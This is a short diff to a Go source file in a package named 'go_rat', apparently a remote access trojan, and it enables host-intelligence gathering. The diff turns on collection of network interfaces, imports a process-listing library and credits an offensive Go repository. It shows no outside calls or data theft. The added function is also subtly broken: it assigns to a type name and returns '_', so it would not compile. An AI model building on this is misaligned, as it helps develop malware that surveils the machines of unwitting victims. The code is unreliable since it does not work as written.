@@ -1,12 +1,18 @@
 /*/
 This file contains the code for gathering host intelligence
+	-uses code from the following sources of open source information
+		https://github.com/bluesentinelsec/OffensiveGoLang/blob/master/pkg/windows/discovery/processes.go
 /*/
 
 package go_rat
 
 // import the libraries we need
 import (
+	"net"
 	"strconv"
+
+	// necessary for gathering process information
+	"github.com/shirou/gopsutil/process"
 )
 
 /*
@@ -15,8 +21,9 @@ the rat is in residence on
 */
 func gather_intel(intel_struct HostIntel) (HostIntel, error) {
 	// Get all network interfaces
-	//interfaces, _ := net.Interfaces()
-	//return interfaces, nil
+	interfaces, _ := net.Interfaces()
+	HostIntel.interfaces = interfaces
+	return _, nil
 }
 
 // Procs returns a slice of process objects
